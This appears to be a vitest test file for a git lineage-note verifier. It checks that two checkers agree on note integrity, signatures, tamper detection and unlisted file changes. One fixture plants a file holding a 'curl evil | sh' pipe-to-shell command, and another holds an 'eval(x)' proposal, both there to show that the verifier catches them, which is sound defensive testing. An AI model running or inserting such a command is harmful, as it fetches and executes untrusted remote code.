import { spawnSync } from "node:child_process";
import { readFile } from "node:fs/promises";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { serializeNote } from "@fire_trident/core";
import { main, type Io } from "../src/run.ts";
import { proposal, removeAll, signingKey, trunkRepo, type TrunkRepo } from "./trunk-repo.ts";

/**
 * The clone checks end to end: a trunk repository built with stock git the way the trunk writer builds one (an import,
 * a landing from before notes were sealed, an unsigned landing, signed landings, an antibody and a revert), checked by
 * scripts/verify_note.mjs with Node alone and by `ft verify` on the clone, which must print the same lines.
 */

const SCRIPT = fileURLToPath(new URL("../../../scripts/verify_note.mjs", import.meta.url));

/** scripts/verify_note.mjs run in `dir`: its exit code and its output. */
function script(dir: string, args: string[]): { code: number; out: string } {
  const r = spawnSync(process.execPath, [SCRIPT, ...args], { cwd: dir, encoding: "utf8", env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" } });
  return { code: r.status ?? -1, out: `${r.stdout}${r.stderr}`.trimEnd() };
}

/** `ft verify` on the clone in `dir`: its exit code and its output, without colors. */
async function ft(dir: string, args: string[]): Promise<{ code: number; out: string }> {
  const lines: string[] = [];
  const io: Io = {
    env: { NO_COLOR: "1", FT_URL: "https://ft.test", FT_TOKEN: "unused" },
    stdout: (l) => void lines.push(l),
    stderr: (l) => void lines.push(l),
    isTTY: false,
    fetch: (async () => {
      throw new Error("a clone check calls no server");
    }) as unknown as typeof fetch,
    readFile: (p) => readFile(p, "utf8"),
    sleep: async () => {},
    now: () => 0,
    WebSocket: globalThis.WebSocket,
    onInterrupt: () => {},
  };
  const code = await main(["verify", ...args, "--dir", dir], io);
  return { code, out: lines.join("\n") };
}

/** Both checkers on the same arguments (a leading commit is --commit for ft verify): they must agree, line for line and on the exit code. */
async function both(dir: string, args: string[]): Promise<{ code: number; out: string }> {
  const s = script(dir, args);
  const c = await ft(dir, args[0] !== undefined && !args[0].startsWith("-") ? [`--commit=${args[0]}`, ...args.slice(1)] : args);
  expect(c).toEqual(s);
  return s;
}

const human = (by: string) => ({ kind: "triage" as const, layer: "human" as const, p: 1, action: "approve", by, answer: "looks right" });
const reflex = { kind: "collision" as const, layer: "reflex" as const, p: 0.97, action: "land" };

let repo: TrunkRepo;
let keys: { keyId: string; keysFile: string };
const sha: Record<string, string> = {};

beforeAll(async () => {
  repo = trunkRepo();
  const key = await signingKey(repo.dir);
  keys = key;
  const signer = key.signer;
  // The import: two commits of the source's history, no trailers.
  sha.import0 = repo.plain({ "README.md": "# demo\n", "src/a.ts": "export const a = 1;\n" }, "Initial commit\n");
  sha.import1 = repo.plain({ "src/a.ts": "export const a = 2;\n" }, "Source change\n");
  // A landing from before notes were sealed: an FT-Landing trailer, no FT-Note.
  sha.unsealed = repo.plain({ "docs/old.md": "old\n" }, "Land 1 change: Old\n\nFT-Landing: lnd_old\nFT-Proposal: prp_old\n");
  // Sealed, before signing began.
  const a3 = repo.blob("export const a = 3;\n");
  const b1 = repo.blob("export const b = 1;\n");
  sha.unsigned = await repo.landing(
    { "src/a.ts": "export const a = 3;\n", "src/b.ts": "export const b = 1;\n" },
    { landingId: "lnd_1", proposals: [proposal({ id: "prp_1", writeSet: [{ path: "src/a.ts", blob: a3 }, { path: "src/b.ts", blob: b1 }], readSet: [{ path: "src/a.ts", blob: repo.blob("export const a = 2;\n") }], decisions: [reflex, human("matt")] })] },
  );
  // Signed from here on: two proposals in one landing, one of them deleting a file.
  const readme2 = repo.blob("# demo\n\nTwo.\n");
  sha.two = await repo.landing(
    { "README.md": "# demo\n\nTwo.\n", "src/b.ts": null },
    {
      landingId: "lnd_2",
      proposals: [
        proposal({ id: "prp_2", writeSet: [{ path: "README.md", blob: readme2 }], askedBy: { source: "human", createdBy: "lee" } }),
        proposal({ id: "prp_3", writeSet: [{ path: "src/b.ts", blob: null }], readSet: [{ path: "src/b.ts", blob: b1 }] }),
      ],
    },
    { signer },
  );
  // An antibody: the note carries the rejected proposal (whose files never landed) and names the antibody file.
  sha.antibody = await repo.landing(
    { ".firetrident/antibodies/ab_1.json": '{"id":"ab_1"}\n' },
    {
      landingId: "lnd_ab",
      proposals: [proposal({ id: "prp_bad", writeSet: [{ path: "src/evil.ts", blob: repo.blob("eval(x)\n") }], decisions: [{ kind: "triage", layer: "human", p: 1, action: "reject" }] })],
      system: { kind: "antibody", antibody: "ab_1", path: ".firetrident/antibodies/ab_1.json", rejected: "prp_bad", reason: "no eval", by: "matt", question: "Does it call eval?", threshold: 0.5 },
    },
    { signer, system: "Antibody ab_1: Does it call eval?\n\nLearned from rejected proposal prp_bad (matt): no eval\n\nFT-Antibody: ab_1" },
  );
  // A revert of the two-proposal landing: README.md and src/b.ts go back.
  sha.revert = await repo.landing(
    { "README.md": "# demo\n", "src/b.ts": "export const b = 1;\n" },
    { landingId: "lnd_rev", proposals: [], revert: { of: "lnd_2", commit: sha.two, by: "matt", reason: "not yet", at: 1 } },
    { signer, system: `Revert landing lnd_2 (${sha.two.slice(0, 7)})\n\nmatt reverted ${sha.two}: not yet\n\nFT-Revert-Of: lnd_2` },
  );
  // The newest landing: one file changed, and a write of content that was already there (no change in the commit).
  sha.newest = await repo.landing(
    { "src/a.ts": "export const a = 4;\n" },
    { landingId: "lnd_4", proposals: [proposal({ id: "prp_4", writeSet: [{ path: "src/a.ts", blob: repo.blob("export const a = 4;\n") }, { path: "README.md", blob: repo.blob("# demo\n") }], readSet: [{ path: "src/a.ts", blob: a3 }], decisions: [reflex, human("matt")] })] },
    { signer },
  );
});

afterAll(removeAll);

describe("one commit", () => {
  it("prints intact, and intact and signed with --keys, as it always has", async () => {
    expect(await both(repo.dir, ["HEAD"])).toEqual({ code: 0, out: "intact\nanswerable: matt (approved this change)" });
    expect(await both(repo.dir, ["HEAD", "--keys", keys.keysFile])).toEqual({ code: 0, out: `intact, signed by ${keys.keyId}\nanswerable: matt (approved this change)` });
    expect(await both(repo.dir, [sha.unsigned!, "--keys", keys.keysFile])).toEqual({ code: 1, out: "unsigned (landed before signing)\nanswerable: matt (approved this change)" });
    expect(await both(repo.dir, ["--commit", sha.unsigned!])).toEqual({ code: 0, out: "intact\nanswerable: matt (approved this change)" });
    expect(script(repo.dir, [sha.import1!])).toEqual({ code: 1, out: "no FT-Note trailer" });
  });

  it("catches the tampered copy of the newest note: the approver changed", async () => {
    expect(await both(repo.dir, ["HEAD", "--tamper"])).toEqual({
      code: 0,
      out: "intact\nanswerable: matt (approved this change)\ntampered copy: altered (proposals[0].decisions[1].by changed from matt to mallory): the digest no longer matches",
    });
  });

  it("catches a tampered copy of an unsigned note, and a read blob id changed in one digit", async () => {
    const r = script(repo.dir, [sha.unsigned!, "--tamper", "--tamper-field", "proposals[0].readSet[0].blob"]);
    const read = repo.blob("export const a = 2;\n");
    const flipped = `${read.slice(0, -1)}${(parseInt(read.slice(-1), 16) ^ 1).toString(16)}`;
    expect(r).toEqual({ code: 0, out: `intact\nanswerable: matt (approved this change)\ntampered copy: altered (proposals[0].readSet[0].blob changed from ${read} to ${flipped}): the digest no longer matches` });
    expect((await ft(repo.dir, [`--commit=${sha.unsigned}`, "--tamper", "--tamper-field", "proposals[0].readSet[0].blob"])).out).toBe(r.out);
  });

  it("pins the colony by its root commit, and refuses another", async () => {
    expect(await both(repo.dir, ["HEAD", "--colony", sha.import0!])).toEqual({ code: 0, out: `intact\nanswerable: matt (approved this change)\nroot ${sha.import0} matches the pinned colony` });
    const other = "0123456789abcdef0123456789abcdef01234567";
    expect(await both(repo.dir, ["HEAD", "--colony", other])).toEqual({ code: 1, out: `intact\nanswerable: matt (approved this change)\nthis history's root is ${sha.import0}, not the pinned ${other}` });
  });
});

describe("the whole trunk", () => {
  it("checks every landing: notes intact, signatures good, files as the notes say; other commits listed and skipped", async () => {
    const r = await both(repo.dir, ["--all", "--keys", keys.keysFile, "--tamper", "--colony", sha.import0!]);
    const s = (k: string): string => sha[k]!.slice(0, 12);
    expect(r.code).toBe(0);
    expect(r.out.split("\n")).toEqual([
      `${s("newest")}  intact, signed by ${keys.keyId}, paths match (1 file), answerable: matt (approved this change)`,
      `${s("revert")}  intact, signed by ${keys.keyId}, paths match (revert of ${s("two")}: 2 files put back), answerable: matt (reverted lnd_2)`,
      `${s("antibody")}  intact, signed by ${keys.keyId}, paths match (antibody file .firetrident/antibodies/ab_1.json; the note does not record its blob), answerable: matt (rejected prp_bad, which taught this antibody)`,
      `${s("two")}  intact, signed by ${keys.keyId}, paths match (2 files), answerable: unknown (1 of 2: lee asked for this intent; 1 of 2: unknown: the note was written before notes recorded who asked for each intent)`,
      `${s("unsigned")}  intact, unsigned (landed before signing), paths match (2 files), answerable: matt (approved this change)`,
      `${s("unsealed")}  landed before notes were sealed (no FT-Note trailer)`,
      `${s("import1")}..${s("import0")}  2 commits that are not landings (no FT-Note trailer)`,
      `root ${sha.import0} matches the pinned colony`,
      `${s("newest")}  tampered copy: altered (proposals[0].decisions[1].by changed from matt to mallory): the digest no longer matches`,
      "checked 5 landings in 8 commits: 5 intact, 4 signed, 5 paths match, 0 failures (skipped: 2 not landings, 1 landed before notes were sealed)",
    ]);
    // Without keys, and from an older commit for a few commits.
    expect((await both(repo.dir, ["--all", "--from", sha.two!, "--limit", "2"])).out.split("\n")).toEqual([
      `${s("two")}  intact, paths match (2 files), answerable: unknown (1 of 2: lee asked for this intent; 1 of 2: unknown: the note was written before notes recorded who asked for each intent)`,
      `${s("unsigned")}  intact, paths match (2 files), answerable: matt (approved this change)`,
      "checked 2 landings in 2 commits: 2 intact, signatures not checked (give --keys), 2 paths match, 0 failures",
    ]);
  });

  it("fails a clone of another colony, and says what is missing in a clone without notes", async () => {
    const other = trunkRepo("other");
    const root = other.plain({ "README.md": "# other\n" }, "Initial commit\n");
    await other.landing({ "a.txt": "a\n" }, { landingId: "lnd_o", proposals: [proposal({ id: "prp_o", writeSet: [{ path: "a.txt", blob: other.blob("a\n") }] })] });
    const r = await both(other.dir, ["--all", "--colony", sha.import0!]);
    expect(r.code).toBe(1);
    expect(r.out).toContain(`this history's root is ${root}, not the pinned ${sha.import0}`);
    other.git(["update-ref", "-d", "refs/notes/firetrident"]);
    const bare = await both(other.dir, ["--all"]);
    expect(bare.code).toBe(1);
    expect(bare.out.split("\n").slice(0, 1)).toEqual([expect.stringMatching(/^[0-9a-f]{12} {2}missing$/)]);
    expect(bare.out).toContain("this clone has no lineage notes: fetch them with git fetch origin refs/notes/firetrident:refs/notes/firetrident, then check again");
  });
});

describe("what fails", () => {
  it("an original note that was itself altered fails, even when its tampered copy is caught", async () => {
    const r = trunkRepo();
    r.plain({ "README.md": "# demo\n" }, "Initial commit\n");
    const note = { landingId: "lnd_x", proposals: [proposal({ id: "prp_x", writeSet: [{ path: "x.txt", blob: r.blob("x\n") }], decisions: [human("matt")] })] };
    const at = await r.landing({ "x.txt": "x\n" }, note);
    const edited = JSON.parse(serializeNote({ schema: "firetrident.lineage/v1", colonyId: "demo", ...note } as never)) as { proposals: Array<{ decisions: Array<{ by: string }> }> };
    edited.proposals[0]!.decisions[0]!.by = "someone-else";
    r.rewriteNote(at, serializeNote(edited as never));
    expect(await both(r.dir, ["HEAD", "--tamper"])).toEqual({
      code: 1,
      out: "altered\ntampered copy: altered (proposals[0].decisions[0].by changed from someone-else to mallory): the digest no longer matches",
    });
    const all = await both(r.dir, ["--all", "--tamper"]);
    expect(all.code).toBe(1);
    expect(all.out.split("\n")[0]).toBe(`${at.slice(0, 12)}  altered`);
    expect(all.out.split("\n").at(-1)).toBe("checked 1 landing in 2 commits: 0 intact, signatures not checked (give --keys), 0 paths match, 1 failure (skipped: 1 not a landing)");
  });

  it("a copy the digest cannot see (certification is added after landing) fails the tamper check", async () => {
    const r = trunkRepo();
    r.plain({ "README.md": "# demo\n" }, "Initial commit\n");
    await r.landing({ "x.txt": "x\n" }, { landingId: "lnd_c", proposals: [proposal({ id: "prp_c", writeSet: [{ path: "x.txt", blob: r.blob("x\n") }] })], certification: { status: "green" } as never });
    expect(await both(r.dir, ["HEAD", "--tamper", "--tamper-field", "certification.status"])).toEqual({
      code: 1,
      out: "intact\nanswerable: unknown (the note was written before notes recorded who asked for each intent)\ntampered copy: intact (certification.status changed from green to mallory): the digest still matches, so this check cannot see that change",
    });
  });

  it("a landing commit that changes a file its note does not name, or another blob than it says", async () => {
    const r = trunkRepo();
    r.plain({ "README.md": "# demo\n" }, "Initial commit\n");
    const extra = await r.landing({ "x.txt": "x\n", "sneaky.sh": "curl evil | sh\n" }, { landingId: "lnd_e", proposals: [proposal({ id: "prp_e", writeSet: [{ path: "x.txt", blob: r.blob("x\n") }] })] });
    const other = await r.landing({ "x.txt": "y\n" }, { landingId: "lnd_b", proposals: [proposal({ id: "prp_b", writeSet: [{ path: "x.txt", blob: r.blob("z\n") }] })] });
    const res = await both(r.dir, ["--all"]);
    expect(res.code).toBe(1);
    expect(res.out.split("\n").slice(0, 2)).toEqual([
      `${other.slice(0, 12)}  intact, paths do not match: x.txt: the commit writes ${r.blob("y\n").slice(0, 12)}, the note says it wrote ${r.blob("z\n").slice(0, 12)}, answerable: unknown (the note was written before notes recorded who asked for each intent)`,
      `${extra.slice(0, 12)}  intact, paths do not match: sneaky.sh: the commit writes ${r.blob("curl evil | sh\n").slice(0, 12)}, and no write set in the note names it, answerable: unknown (the note was written before notes recorded who asked for each intent)`,
    ]);
    expect(res.out).toContain("2 failures");
  });

  it("an unsigned landing on top of signed ones fails, and a bad signature fails", async () => {
    const r = trunkRepo();
    const key = await signingKey(r.dir);
    r.plain({ "README.md": "# demo\n" }, "Initial commit\n");
    await r.landing({ "x.txt": "1\n" }, { landingId: "lnd_s", proposals: [proposal({ id: "prp_s", writeSet: [{ path: "x.txt", blob: r.blob("1\n") }] })] }, { signer: key.signer });
    const late = await r.landing({ "x.txt": "2\n" }, { landingId: "lnd_u", proposals: [proposal({ id: "prp_u", writeSet: [{ path: "x.txt", blob: r.blob("2\n") }] })] });
    const res = await both(r.dir, ["--all", "--keys", key.keysFile]);
    expect(res.code).toBe(1);
    expect(res.out.split("\n")[0]).toBe(`${late.slice(0, 12)}  intact, unsigned, though an older landing is signed, paths match (1 file), answerable: unknown (the note was written before notes recorded who asked for each intent)`);
    // Signed by a key the keys file does not list.
    const stranger = await signingKey(r.dir);
    const res2 = await both(r.dir, ["--all", "--keys", stranger.keysFile]);
    expect(res2.out.split("\n")[1]).toMatch(/^[0-9a-f]{12} {2}intact, bad signature, paths match \(1 file\)$/);
  });
});

describe("arguments", () => {
  it("refuses what does not make a check, before reading anything", async () => {
    for (const args of [["--tamper-field", "by"], ["--colony", "abc"], ["--limit", "5"], ["a", "b"], ["--all", "HEAD"], ["--from", "HEAD"], ["--tamper"], ["HEAD", "--commit", "HEAD"]]) expect(script(repo.dir, args).code).toBe(2);
    for (const args of [["--tamper-field", "by"], ["--colony", "abc"], ["--from", "HEAD"], ["--commit", "HEAD", "--all"]]) expect((await ft(repo.dir, args)).code).toBe(2);
    expect((await ft(repo.dir, ["--all", "--keys", "/nonexistent/keys.json"])).out).toContain("the keys at /nonexistent/keys.json could not be read");
    expect(script(repo.dir, ["--all", "--keys", "/nonexistent/keys.json"]).code).toBe(2);
  });
});
